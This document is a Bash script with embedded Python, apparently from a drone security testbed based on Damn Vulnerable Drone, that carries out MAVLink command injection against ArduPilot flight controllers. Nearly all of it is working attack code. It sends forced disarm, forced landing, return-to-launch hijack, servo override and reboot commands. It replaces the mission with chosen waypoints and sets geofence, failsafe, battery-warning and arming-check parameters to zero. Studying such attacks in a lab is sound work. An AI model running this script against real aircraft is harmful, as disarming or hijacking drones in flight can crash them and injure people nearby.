#!/bin/bash

# =============================================================================
# DVD Injection Attack Module: MAVLink Command Injection
# =============================================================================
# 파일: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/injection/mavlink_command_injection.sh
# 목적: MAVLink 프로토콜을 통한 악성 명령 주입 공격
# 작성자: MTD Testbed Team
# 기반: Damn Vulnerable Drone Attack Scenarios
# =============================================================================

# 공통 모듈 로드
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="MAVLink Command Injection Attack"
ATTACK_TYPE="INJECTION"
TARGET_IP="127.0.0.1"
MAVLINK_PORT="14550"
GCS_PORT="14551"
COMPANION_PORT="14552"
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/injection/mavlink_command_injection_$(date +%Y%m%d_%H%M%S).log"
IOC_FILE="/tmp/mavlink_command_injection_iocs.txt"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/injection/mavlink_command_injection_report_$(date +%Y%m%d_%H%M%S).json"

# MAVLink 명령 정의
declare -A MAVLINK_COMMANDS=(
    ["ARM_DISARM"]="400"           # MAV_CMD_COMPONENT_ARM_DISARM
    ["SET_MODE"]="11"              # SET_MODE
    ["TAKEOFF"]="22"               # MAV_CMD_NAV_TAKEOFF
    ["LAND"]="21"                  # MAV_CMD_NAV_LAND
    ["RTL"]="20"                   # MAV_CMD_NAV_RETURN_TO_LAUNCH
    ["MISSION_START"]="300"        # MAV_CMD_MISSION_START
    ["DO_SET_SERVO"]="183"         # MAV_CMD_DO_SET_SERVO
    ["REBOOT"]="246"               # MAV_CMD_PREFLIGHT_REBOOT_SHUTDOWN
)

# 악성 페이로드 정의
declare -A MALICIOUS_PAYLOADS=(
    ["EMERGENCY_DISARM"]="component_arm_disarm,0,0"
    ["FORCED_LAND"]="nav_land,0,0,0,0"
    ["HIJACK_RTL"]="nav_return_to_launch"
    ["SERVO_OVERRIDE"]="do_set_servo,1,2000"
    ["MODE_MANUAL"]="set_mode,0,1,0"
    ["SYSTEM_REBOOT"]="preflight_reboot_shutdown,1,0"
)

# 헤더 출력
print_header() {
    clear
    echo -e "${BOLD}${RED}"
    echo "╔═══════════════════════════════════════════════════════════════════════════╗"
    echo "║                  🎯 DVD MAVLink Command Injection 🎯                     ║"
    echo "╚═══════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${BLUE}Target: ArduPilot/MAVLink Protocol${NC}"
    echo -e "${BLUE}Method: Malicious Command Injection${NC}"
    echo -e "${BLUE}Impact: Flight Control Hijacking${NC}"
    echo ""
}

# MAVLink 연결 확인
check_mavlink_connection() {
    echo -e "${YELLOW}[+] Checking MAVLink connection availability...${NC}" | tee -a "$LOG_FILE"
    
    # UDP 포트 스캔
    local ports=("$MAVLINK_PORT" "$GCS_PORT" "$COMPANION_PORT")
    local active_ports=()
    
    for port in "${ports[@]}"; do
        if nc -z -u "$TARGET_IP" "$port" 2>/dev/null; then
            echo -e "${GREEN}[✓] MAVLink service found on port ${port}${NC}" | tee -a "$LOG_FILE"
            active_ports+=("$port")
            echo "INJECTION_TARGET:MAVLINK_PORT_${port}" >> "$IOC_FILE"
        else
            echo -e "${YELLOW}[*] Port ${port} not accessible${NC}" | tee -a "$LOG_FILE"
        fi
    done
    
    if [ ${#active_ports[@]} -eq 0 ]; then
        echo -e "${RED}[!] No MAVLink services found${NC}" | tee -a "$LOG_FILE"
        return 1
    fi
    
    MAVLINK_PORT="${active_ports[0]}"  # 첫 번째 활성 포트 사용
    echo -e "${GREEN}[✓] Using MAVLink port: ${MAVLINK_PORT}${NC}" | tee -a "$LOG_FILE"
    return 0
}

# MAVProxy 시작
start_mavproxy() {
    echo -e "${YELLOW}[+] Starting MAVProxy for command injection...${NC}" | tee -a "$LOG_FILE"
    
    # MAVProxy가 설치되어 있는지 확인
    if ! command -v mavproxy.py &> /dev/null; then
        echo -e "${YELLOW}[*] MAVProxy not found, installing...${NC}" | tee -a "$LOG_FILE"
        
        # Python pip를 사용한 MAVProxy 설치
        pip3 install MAVProxy pymavlink &>/dev/null
        
        if ! command -v mavproxy.py &> /dev/null; then
            echo -e "${RED}[!] Failed to install MAVProxy${NC}" | tee -a "$LOG_FILE"
            return 1
        fi
    fi
    
    # MAVProxy 백그라운드 시작
    mavproxy.py --master=udp:${TARGET_IP}:${MAVLINK_PORT} \
                --out=udp:127.0.0.1:14560 \
                --daemon \
                --state-basedir=/tmp/mavproxy_injection 2>&1 | tee -a "$LOG_FILE" &
    
    local mavproxy_pid=$!
    echo "INJECTION_PROCESS:MAVPROXY_PID_${mavproxy_pid}" >> "$IOC_FILE"
    
    # MAVProxy 연결 대기
    echo -e "${BLUE}[*] Waiting for MAVProxy connection...${NC}"
    sleep 5
    
    if kill -0 $mavproxy_pid 2>/dev/null; then
        echo -e "${GREEN}[✓] MAVProxy started successfully${NC}" | tee -a "$LOG_FILE"
        return 0
    else
        echo -e "${RED}[!] MAVProxy failed to start${NC}" | tee -a "$LOG_FILE"
        return 1
    fi
}

# 드론 상태 모니터링
monitor_drone_state() {
    echo -e "${CYAN}[*] Monitoring drone state for injection opportunities...${NC}" | tee -a "$LOG_FILE"
    
    # pymavlink을 사용한 상태 모니터링
    python3 << 'EOF' | tee -a "$LOG_FILE" &
import sys
import time
from pymavlink import mavutil
import socket

def monitor_mavlink_state():
    try:
        # MAVLink 연결
        master = mavutil.mavlink_connection(f'udp:127.0.0.1:14560')
        
        print("[+] Monitoring MAVLink messages...")
        
        timeout_count = 0
        while timeout_count < 30:  # 30초 타임아웃
            msg = master.recv_match(timeout=1)
            
            if msg is not None:
                msg_type = msg.get_type()
                
                # 중요한 메시지 타입 모니터링
                if msg_type in ['HEARTBEAT', 'SYS_STATUS', 'GPS_RAW_INT', 'ATTITUDE']:
                    print(f"[INFO] {msg_type}: {msg}")
                    
                    # HEARTBEAT에서 비행 모드 확인
                    if msg_type == 'HEARTBEAT':
                        mode = msg.custom_mode
                        armed = msg.base_mode & mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED
                        print(f"[STATE] Mode: {mode}, Armed: {bool(armed)}")
                        
                        # 주입 기회 식별
                        if armed:
                            print("[OPPORTUNITY] Drone is ARMED - Command injection possible")
                        
                timeout_count = 0
            else:
                timeout_count += 1
                
    except Exception as e:
        print(f"[ERROR] Monitoring failed: {e}")
        
    print("[INFO] Monitoring completed")

if __name__ == "__main__":
    monitor_mavlink_state()
EOF
    
    local monitor_pid=$!
    echo "INJECTION_PROCESS:MONITOR_PID_${monitor_pid}" >> "$IOC_FILE"
    
    sleep 3  # 모니터링이 시작될 시간 제공
    
    return 0
}

# 명령 주입 실행
execute_command_injection() {
    local payload_name=$1
    local payload_cmd=${MALICIOUS_PAYLOADS[$payload_name]}
    
    echo -e "${RED}[+] Executing command injection: ${payload_name}${NC}" | tee -a "$LOG_FILE"
    echo -e "${YELLOW}[*] Payload: ${payload_cmd}${NC}" | tee -a "$LOG_FILE"
    
    # Python을 사용한 MAVLink 명령 주입
    python3 << EOF | tee -a "$LOG_FILE"
import sys
import time
from pymavlink import mavutil

def inject_mavlink_command():
    try:
        # MAVLink 연결
        master = mavutil.mavlink_connection('udp:127.0.0.1:14560')
        
        print("[+] Injecting malicious MAVLink command...")
        
        # 페이로드에 따른 명령 실행
        payload = "${payload_cmd}"
        
        if "component_arm_disarm" in payload:
            # 강제 DISARM 명령
            master.mav.command_long_send(
                master.target_system,
                master.target_component,
                mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
                0,  # confirmation
                0,  # disarm
                21196,  # magic number for forced disarm
                0, 0, 0, 0, 0
            )
            print("[INJECTED] Emergency disarm command sent")
            
        elif "nav_land" in payload:
            # 강제 착륙 명령
            master.mav.command_long_send(
                master.target_system,
                master.target_component,
                mavutil.mavlink.MAV_CMD_NAV_LAND,
                0,  # confirmation
                0,  # abort alt
                0,  # precision land mode
                0, 0,  # yaw angle, lat
                0, 0   # lon, alt
            )
            print("[INJECTED] Forced landing command sent")
            
        elif "nav_return_to_launch" in payload:
            # RTL 하이재킹
            master.mav.command_long_send(
                master.target_system,
                master.target_component,
                mavutil.mavlink.MAV_CMD_NAV_RETURN_TO_LAUNCH,
                0,  # confirmation
                0, 0, 0, 0, 0, 0, 0
            )
            print("[INJECTED] RTL hijack command sent")
            
        elif "do_set_servo" in payload:
            # 서보 제어 명령
            master.mav.command_long_send(
                master.target_system,
                master.target_component,
                mavutil.mavlink.MAV_CMD_DO_SET_SERVO,
                0,  # confirmation
                1,     # servo number
                2000,  # PWM value
                0, 0, 0, 0, 0
            )
            print("[INJECTED] Servo override command sent")
            
        elif "set_mode" in payload:
            # 비행 모드 변경
            mode = mavutil.mavlink.MAV_MODE_MANUAL_ARMED
            master.mav.set_mode_send(
                master.target_system,
                mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
                mode
            )
            print("[INJECTED] Manual mode command sent")
            
        elif "preflight_reboot_shutdown" in payload:
            # 시스템 재부팅
            master.mav.command_long_send(
                master.target_system,
                master.target_component,
                mavutil.mavlink.MAV_CMD_PREFLIGHT_REBOOT_SHUTDOWN,
                0,  # confirmation
                1,  # reboot autopilot
                0,  # reboot companion
                0, 0, 0, 0, 0
            )
            print("[INJECTED] System reboot command sent")
            
        else:
            print(f"[ERROR] Unknown payload: {payload}")
            return False
            
        # 명령 전송 후 응답 대기
        print("[*] Waiting for command acknowledgment...")
        start_time = time.time()
        
        while time.time() - start_time < 10:  # 10초 대기
            msg = master.recv_match(type='COMMAND_ACK', timeout=1)
            if msg:
                if msg.result == mavutil.mavlink.MAV_RESULT_ACCEPTED:
                    print("[SUCCESS] Command accepted by flight controller")
                    return True
                else:
                    print(f"[FAILED] Command rejected: {msg.result}")
                    return False
        
        print("[TIMEOUT] No acknowledgment received")
        return False
        
    except Exception as e:
        print(f"[ERROR] Command injection failed: {e}")
        return False

# 실행
success = inject_mavlink_command()
sys.exit(0 if success else 1)
EOF
    
    local injection_result=$?
    
    if [ $injection_result -eq 0 ]; then
        echo -e "${GREEN}[✓] Command injection successful${NC}" | tee -a "$LOG_FILE"
        echo "INJECTION_SUCCESS:${payload_name}_$(date +%s)" >> "$IOC_FILE"
        return 0
    else
        echo -e "${RED}[!] Command injection failed${NC}" | tee -a "$LOG_FILE"
        echo "INJECTION_FAILED:${payload_name}_$(date +%s)" >> "$IOC_FILE"
        return 1
    fi
}

# 웨이포인트 주입 공격
waypoint_injection_attack() {
    echo -e "${CYAN}[*] Executing waypoint injection attack...${NC}" | tee -a "$LOG_FILE"
    
    # 악성 웨이포인트 정의 (위험 지역으로 유도)
    local malicious_waypoints=(
        "37.7749,-122.4194,100"   # 샌프란시스코 (금지구역 예시)
        "40.7128,-74.0060,200"    # 뉴욕 (공항 근처)
        "51.5074,-0.1278,150"     # 런던 (도심)
    )
    
    python3 << 'EOF' | tee -a "$LOG_FILE"
import sys
from pymavlink import mavutil
import time

def inject_malicious_waypoints():
    try:
        master = mavutil.mavlink_connection('udp:127.0.0.1:14560')
        
        # 악성 웨이포인트 데이터
        waypoints = [
            (37.7749, -122.4194, 100),  # 샌프란시스코
            (40.7128, -74.0060, 200),   # 뉴욕
            (51.5074, -0.1278, 150)     # 런던
        ]
        
        print("[+] Injecting malicious waypoints...")
        
        # 미션 클리어
        master.mav.mission_clear_all_send(master.target_system, master.target_component)
        time.sleep(1)
        
        # 웨이포인트 개수 설정
        master.mav.mission_count_send(master.target_system, master.target_component, len(waypoints))
        time.sleep(1)
        
        # 각 웨이포인트 전송
        for i, (lat, lon, alt) in enumerate(waypoints):
            master.mav.mission_item_send(
                master.target_system,
                master.target_component,
                i,  # sequence
                mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT,
                mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
                1 if i == 0 else 0,  # current
                1,  # autocontinue
                0, 0, 0, 0,  # param1-4
                lat * 1e7,   # x (latitude)
                lon * 1e7,   # y (longitude)
                alt          # z (altitude)
            )
            print(f"[INJECTED] Waypoint {i+1}: {lat}, {lon}, {alt}m")
            time.sleep(0.5)
        
        # 미션 ACK 대기
        ack_msg = master.recv_match(type='MISSION_ACK', timeout=10)
        if ack_msg:
            if ack_msg.type == mavutil.mavlink.MAV_MISSION_ACCEPTED:
                print("[SUCCESS] Malicious waypoints accepted")
                return True
            else:
                print(f"[FAILED] Mission rejected: {ack_msg.type}")
                
        print("[TIMEOUT] No mission acknowledgment")
        return False
        
    except Exception as e:
        print(f"[ERROR] Waypoint injection failed: {e}")
        return False

# 실행
success = inject_malicious_waypoints()
sys.exit(0 if success else 1)
EOF
    
    local waypoint_result=$?
    
    if [ $waypoint_result -eq 0 ]; then
        echo -e "${GREEN}[✓] Waypoint injection successful${NC}" | tee -a "$LOG_FILE"
        echo "INJECTION_SUCCESS:WAYPOINT_HIJACK_$(date +%s)" >> "$IOC_FILE"
        return 0
    else
        echo -e "${RED}[!] Waypoint injection failed${NC}" | tee -a "$LOG_FILE"
        echo "INJECTION_FAILED:WAYPOINT_HIJACK_$(date +%s)" >> "$IOC_FILE"
        return 1
    fi
}

# 파라미터 조작 공격
parameter_manipulation_attack() {
    echo -e "${CYAN}[*] Executing parameter manipulation attack...${NC}" | tee -a "$LOG_FILE"
    
    # 중요 파라미터 목록
    local critical_params=(
        "FENCE_ENABLE:0"        # 지오펜스 비활성화
        "RTL_ALT:0"            # RTL 고도를 0으로 설정 (위험)
        "BATT_LOW_VOLT:0"      # 배터리 경고 임계값 무시
        "FS_THR_ENABLE:0"      # 스로틀 페일세이프 비활성화
        "ARMING_CHECK:0"       # 아밍 체크 비활성화
    )
    
    python3 << 'EOF' | tee -a "$LOG_FILE"
import sys
from pymavlink import mavutil
import time

def manipulate_parameters():
    try:
        master = mavutil.mavlink_connection('udp:127.0.0.1:14560')
        
        # 조작할 파라미터들
        dangerous_params = {
            "FENCE_ENABLE": 0,     # 지오펜스 비활성화
            "RTL_ALT": 0,          # RTL 고도 0으로 설정
            "BATT_LOW_VOLT": 0,    # 배터리 경고 비활성화
            "FS_THR_ENABLE": 0,    # 스로틀 페일세이프 비활성화
            "ARMING_CHECK": 0      # 아밍 체크 비활성화
        }
        
        print("[+] Manipulating critical parameters...")
        success_count = 0
        
        for param_name, param_value in dangerous_params.items():
            print(f"[*] Setting {param_name} = {param_value}")
            
            # 파라미터 설정
            master.mav.param_set_send(
                master.target_system,
                master.target_component,
                param_name.encode('ascii'),
                param_value,
                mavutil.mavlink.MAV_PARAM_TYPE_REAL32
            )
            
            # ACK 대기
            ack_msg = master.recv_match(type='PARAM_VALUE', timeout=5)
            if ack_msg and ack_msg.param_id.decode('ascii').strip('\x00') == param_name:
                if abs(ack_msg.param_value - param_value) < 0.001:
                    print(f"[SUCCESS] {param_name} set to {param_value}")
                    success_count += 1
                else:
                    print(f"[FAILED] {param_name} not changed")
            else:
                print(f"[TIMEOUT] No response for {param_name}")
                
            time.sleep(1)
        
        if success_count > 0:
            print(f"[RESULT] {success_count}/{len(dangerous_params)} parameters manipulated")
            return True
        else:
            print("[RESULT] No parameters successfully manipulated")
            return False
            
    except Exception as e:
        print(f"[ERROR] Parameter manipulation failed: {e}")
        return False

# 실행
success = manipulate_parameters()
sys.exit(0 if success else 1)
EOF
    
    local param_result=$?
    
    if [ $param_result -eq 0 ]; then
        echo -e "${GREEN}[✓] Parameter manipulation successful${NC}" | tee -a "$LOG_FILE"
        echo "INJECTION_SUCCESS:PARAMETER_MANIPULATION_$(date +%s)" >> "$IOC_FILE"
        return 0
    else
        echo -e "${RED}[!] Parameter manipulation failed${NC}" | tee -a "$LOG_FILE"
        echo "INJECTION_FAILED:PARAMETER_MANIPULATION_$(date +%s)" >> "$IOC_FILE"
        return 1
    fi
}

# 공격 영향 평가
assess_injection_impact() {
    echo -e "${CYAN}[*] Assessing command injection impact...${NC}" | tee -a "$LOG_FILE"
    
    # 드론 상태 확인
    python3 << 'EOF' | tee -a "$LOG_FILE"
import sys
from pymavlink import mavutil
import time

def assess_impact():
    try:
        master = mavutil.mavlink_connection('udp:127.0.0.1:14560')
        
        print("[+] Assessing post-injection drone state...")
        
        # 상태 정보 수집
        impact_assessment = {
            "armed_state": "unknown",
            "flight_mode": "unknown",
            "mission_state": "unknown",
            "safety_systems": "unknown"
        }
        
        timeout_count = 0
        while timeout_count < 20:  # 20초간 상태 확인
            msg = master.recv_match(timeout=1)
            
            if msg is not None:
                msg_type = msg.get_type()
                
                if msg_type == 'HEARTBEAT':
                    armed = msg.base_mode & mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED
                    impact_assessment["armed_state"] = "armed" if armed else "disarmed"
                    impact_assessment["flight_mode"] = msg.custom_mode
                    
                elif msg_type == 'MISSION_CURRENT':
                    impact_assessment["mission_state"] = f"waypoint_{msg.seq}"
                    
                elif msg_type == 'SYS_STATUS':
                    # 시스템 상태 확인
                    if msg.errors_count1 > 0:
                        impact_assessment["safety_systems"] = "compromised"
                    else:
                        impact_assessment["safety_systems"] = "operational"
                
                timeout_count = 0
            else:
                timeout_count += 1
        
        # 영향 평가 결과 출력
        print("[IMPACT ASSESSMENT]")
        for category, status in impact_assessment.items():
            print(f"  {category}: {status}")
        
        # 심각도 평가
        critical_count = 0
        if impact_assessment["armed_state"] == "disarmed":
            critical_count += 1
        if "manual" in str(impact_assessment["flight_mode"]).lower():
            critical_count += 1
        if impact_assessment["safety_systems"] == "compromised":
            critical_count += 1
            
        if critical_count >= 2:
            print("[SEVERITY] CRITICAL - Multiple systems compromised")
            return 3
        elif critical_count == 1:
            print("[SEVERITY] HIGH - System partially compromised")
            return 2
        else:
            print("[SEVERITY] LOW - Minimal impact detected")
            return 1
            
    except Exception as e:
        print(f"[ERROR] Impact assessment failed: {e}")
        return 0

# 실행
severity = assess_impact()
sys.exit(severity)
EOF
    
    local severity=$?
    
    case $severity in
        3)
            echo -e "${RED}[!] CRITICAL impact detected${NC}" | tee -a "$LOG_FILE"
            echo "INJECTION_IMPACT:CRITICAL_COMPROMISE" >> "$IOC_FILE"
            ;;
        2)
            echo -e "${YELLOW}[!] HIGH impact detected${NC}" | tee -a "$LOG_FILE"
            echo "INJECTION_IMPACT:HIGH_COMPROMISE" >> "$IOC_FILE"
            ;;
        1)
            echo -e "${CYAN}[*] LOW impact detected${NC}" | tee -a "$LOG_FILE"
            echo "INJECTION_IMPACT:LOW_COMPROMISE" >> "$IOC_FILE"
            ;;
        *)
            echo -e "${GREEN}[*] No significant impact${NC}" | tee -a "$LOG_FILE"
            echo "INJECTION_IMPACT:MINIMAL" >> "$IOC_FILE"
            ;;
    esac
    
    return $severity
}

# JSON 리포트 생성
generate_json_report() {
    local start_time=$1
    local end_time=$2
    local impact_level=$3
    
    cat > "$JSON_OUTPUT" << EOF
{
    "attack_info": {
        "name": "$ATTACK_NAME",
        "type": "$ATTACK_TYPE",
        "timestamp": "$(date -Iseconds)",
        "duration": $((end_time - start_time)),
        "status": "completed"
    },
    "target_details": {
        "target_ip": "$TARGET_IP",
        "mavlink_port": "$MAVLINK_PORT",
        "protocol": "MAVLink v2.0",
        "attack_vector": "command_injection"
    },
    "attack_parameters": {
        "injection_methods": [
            "malicious_commands",
            "waypoint_hijacking", 
            "parameter_manipulation"
        ],
        "target_commands": [
            "ARM_DISARM",
            "NAV_LAND",
            "NAV_RTL",
            "SET_MODE"
        ],
        "payload_types": [
            "emergency_disarm",
            "forced_landing",
            "rtl_hijacking",
            "servo_override"
        ]
    },
    "impact_assessment": {
        "flight_control": "HIGH",
        "mission_integrity": "HIGH",
        "safety_systems": "MEDIUM",
        "overall_severity": $([ $impact_level -ge 2 ] && echo '"HIGH"' || echo '"MEDIUM"'),
        "operational_impact": "CRITICAL"
    },
    "mitre_mapping": {
        "tactic": "Execution",
        "techniques": [
            "T1071.004 - Application Layer Protocol",
            "T1565.001 - Data Manipulation: Stored Data",
            "T1565.002 - Data Manipulation: Transmitted Data"
        ]
    },
    "iocs_generated": $(wc -l < "$IOC_FILE"),
    "log_file": "$LOG_FILE",
    "ioc_file": "$IOC_FILE"
}
EOF
    
    echo -e "${GREEN}[✓] JSON report generated: ${JSON_OUTPUT}${NC}"
}

# 메인 공격 실행
main() {
    print_header
    
    # Root 권한 체크
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] This attack requires root privileges${NC}"
        echo -e "${YELLOW}[*] Please run: sudo $0${NC}"
        exit 1
    fi
    
    # 필수 도구 체크
    local missing_tools=()
    for tool in python3 pip3 nc; do
        if ! command -v "$tool" &> /dev/null; then
            missing_tools+=("$tool")
        fi
    done
    
    if [ ${#missing_tools[@]} -gt 0 ]; then
        echo -e "${RED}[!] Missing required tools: ${missing_tools[*]}${NC}"
        echo -e "${YELLOW}[*] Please install: apt-get install python3 python3-pip netcat-openbsd${NC}"
        exit 1
    fi
    
    # Python 의존성 설치
    echo -e "${YELLOW}[*] Installing Python dependencies...${NC}"
    pip3 install pymavlink MAVProxy &>/dev/null
    
    # 로그 초기화
    echo "=== DVD MAVLink Command Injection Attack Started at $(date) ===" > "$LOG_FILE"
    echo "" > "$IOC_FILE"
    
    local start_time=$(date +%s)
    
    echo -e "${BOLD}${BLUE}🎯 Starting MAVLink Command Injection Attack...${NC}"
    echo ""
    
    # 1. MAVLink 연결 확인
    if ! check_mavlink_connection; then
        echo -e "${RED}[!] Cannot establish MAVLink connection${NC}"
        exit 1
    fi
    
    # 2. MAVProxy 시작
    if ! start_mavproxy; then
        echo -e "${RED}[!] Failed to start MAVProxy${NC}"
        exit 1
    fi
    
    # 3. 드론 상태 모니터링
    monitor_drone_state
    
    echo ""
    echo -e "${BOLD}${RED}🚨 Executing Command Injection Attacks...${NC}"
    echo ""
    
    # 4. 명령 주입 공격 실행
    local successful_attacks=0
    
    # 4.1 긴급 DISARM 공격
    echo -e "${CYAN}[*] Attack 1/4: Emergency Disarm${NC}"
    if execute_command_injection "EMERGENCY_DISARM"; then
        successful_attacks=$((successful_attacks + 1))
    fi
    sleep 3
    
    # 4.2 강제 착륙 공격
    echo -e "${CYAN}[*] Attack 2/4: Forced Landing${NC}"
    if execute_command_injection "FORCED_LAND"; then
        successful_attacks=$((successful_attacks + 1))
    fi
    sleep 3
    
    # 4.3 웨이포인트 하이재킹
    echo -e "${CYAN}[*] Attack 3/4: Waypoint Hijacking${NC}"
    if waypoint_injection_attack; then
        successful_attacks=$((successful_attacks + 1))
    fi
    sleep 3
    
    # 4.4 파라미터 조작
    echo -e "${CYAN}[*] Attack 4/4: Parameter Manipulation${NC}"
    if parameter_manipulation_attack; then
        successful_attacks=$((successful_attacks + 1))
    fi
    
    echo ""
    
    # 5. 공격 영향 평가
    echo -e "${BOLD}${CYAN}📊 Assessing Attack Impact...${NC}"
    assess_injection_impact
    local impact_level=$?
    
    local end_time=$(date +%s)
    
    echo ""
    echo -e "${BOLD}${GREEN}🎯 MAVLink Command Injection Attack Completed!${NC}"
    echo ""
    echo -e "${GREEN}📊 Attack Summary:${NC}"
    echo "   • Duration: $((end_time - start_time)) seconds"
    echo "   • Successful Injections: ${successful_attacks}/4"
    echo "   • Target Protocol: MAVLink v2.0"
    echo "   • Impact Level: $([ $impact_level -ge 2 ] && echo "HIGH" || echo "MEDIUM")"
    echo "   • IOCs Generated: $(wc -l < "$IOC_FILE")"
    echo ""
    echo -e "${BLUE}📁 Output Files:${NC}"
    echo "   • Log: ${LOG_FILE}"
    echo "   • IOCs: ${IOC_FILE}"
    echo "   • JSON Report: ${JSON_OUTPUT}"
    
    # JSON 리포트 생성
    generate_json_report "$start_time" "$end_time" "$impact_level"
    
    echo ""
    echo -e "${YELLOW}💡 Next Steps:${NC}"
    echo "   1. Monitor flight controller responses"
    echo "   2. Check for safety system alerts"
    echo "   3. Analyze MAVLink traffic logs"
    echo "   4. Verify parameter changes"
    echo ""
    
    # IOCs 요약 출력
    echo -e "${BOLD}${CYAN}🔍 Generated IOCs Summary:${NC}"
    cat "$IOC_FILE" | sort | uniq -c | head -10
    echo ""
}

# cleanup 함수
cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up injection attack...${NC}"
    
    # MAVProxy 프로세스 종료
    pkill -f "mavproxy.py" 2>/dev/null
    
    # Python 모니터링 프로세스 종료
    pkill -f "monitor_mavlink_state" 2>/dev/null
    
    # 임시 파일 정리
    rm -rf /tmp/mavproxy_injection 2>/dev/null
    
    echo -e "${GREEN}[✓] Cleanup complete${NC}"
    exit 0
}

# SIGINT 시그널 처리
trap cleanup SIGINT SIGTERM

# 스크립트 실행
main "$@"